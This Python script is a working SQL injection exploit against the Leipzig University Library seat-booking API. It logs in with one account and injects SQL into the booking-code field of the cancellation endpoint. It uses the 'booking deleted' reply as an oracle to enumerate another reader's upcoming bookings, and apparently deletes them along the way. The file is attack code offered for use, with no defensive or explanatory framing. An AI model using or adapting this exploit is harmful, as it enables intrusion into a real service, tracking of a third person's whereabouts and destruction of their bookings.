#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests


def login(readerNumber, password):
    payload = {'readernumber': readerNumber, 'password': password, 'logintype': '1'}
    response = requests.post('https://seats.ub.uni-leipzig.de/api/booking/login', data=payload)
    return response.json()['token']


def exploit(readerNumberForLogin, token, readerNumberForTracking, alreadyKnownWorkspaceIds=[],
            alreadyKnownInstitutions=[], alreadyKnownDates=[]):
    while True:
        alreadyKnownWorkspaceIdsString, alreadyKnownInstitutionsString, alreadyKnownDatesString = createSQLStrings(
            alreadyKnownWorkspaceIds, alreadyKnownInstitutions, alreadyKnownDates)

        sqliString = "' or 1=1 and DATE(start)>DATE(NOW()) and readernumber = '" + readerNumberForTracking + "'" + alreadyKnownWorkspaceIdsString + alreadyKnownInstitutionsString + alreadyKnownDatesString + " order by RAND();#"

        payload = {'readernumber': readerNumberForLogin, 'bookingcode': sqliString, 'token': token}
        response = requests.post('https://seats.ub.uni-leipzig.de/api/booking/storno', data=payload)

        if response.json()['message'] is not None and response.json()['message'] == 'Ihre Buchung wurde gel√∂scht.':
            alreadyKnownWorkspaceIds.append(input('workspaceId?'))
            alreadyKnownInstitutions.append(input('institution?'))
            alreadyKnownDates.append(input('date?'))
        else:
            print('\ndone fetching entries for readerNumber: ' + readerNumberForTracking)
            break


def createSQLStrings(alreadyKnownWorkspaceIds, alreadyKnownInstitutions, alreadyKnownDates):
    alreadyKnownWorkspaceIdsString = convertWorkspaceArrayToSQLClause('workspaceId', alreadyKnownWorkspaceIds)
    alreadyKnownInstitutionsString = convertArrayToSQLClause('institution', alreadyKnownInstitutions)
    alreadyKnownDatesString = convertDateArrayToSQLClause('start', alreadyKnownDates)

    return alreadyKnownWorkspaceIdsString, alreadyKnownInstitutionsString, alreadyKnownDatesString


def convertArrayToSQLClause(parameter, array):
    if len(array) == 0:
        return ''
    else:
        return ' or ' + parameter + ' not in (' + ','.join(f'"{w}"' for w in array) + ')'


def convertWorkspaceArrayToSQLClause(parameter, array):
    if len(array) == 0:
        return ''
    else:
        return ' and (' + parameter + ' not in (' + ','.join(f'"{w}"' for w in array) + ')'


def convertDateArrayToSQLClause(parameter, array):
    if len(array) == 0:
        return ''
    else:
        return ' or DATE_FORMAT(' + parameter + ', \'%Y-%m-%d-%H-%i\') not in (' + ','.join(
            f'DATE_FORMAT("{w}", \'%Y-%m-%d-%H-%i\')' for w in array) + '))'


def main():
    readerNumberForLogin = 'my_readernumber'
    password = 'my_password'
    readerNumberForTracking = 'reader_number_for_tracking'

    token = login(readerNumberForLogin, password)

    exploit(readerNumberForLogin, token, readerNumberForTracking, [], [], [])


if __name__ == '__main__':
    main()
